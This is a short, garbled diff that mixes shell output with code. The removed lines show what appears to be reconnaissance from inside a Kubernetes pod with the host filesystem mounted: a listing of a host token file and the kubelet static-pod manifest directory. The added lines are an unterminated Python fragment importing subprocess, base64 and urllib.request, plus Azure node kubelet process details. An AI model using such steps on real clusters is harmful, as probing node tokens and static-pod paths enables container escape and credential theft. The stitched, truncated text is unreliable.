@@ -1,9 +1,4 @@
-0 /host/etc/kubernetes/cxp.token
-
-=== kubelet manifests dir from node POV ===
-total 12
-drwxr-xr-x    2 root     root          4096 Sep  7 14:30 .
-drwxr-xr-x    5 root     root          4096 Sep  7 14:30 ..
--rw-r--r--    1 root     root           794 Sep  7 14:30 cxp-pod.yaml
-=== kubelet staticPodPath? ===
-cat: can't open '/tmp/.t': No such file or directory
+import time,base64,subprocess,urllib.request,json,os
+X="3d322a056a373f1517632c0d
+---kubelet---
+PID=4178: /opt/bin/kubelet --enable-server --node-labels=agentpool=systemapp1,kubernetes.azure.com/agentpool=systemapp1,agentpool=
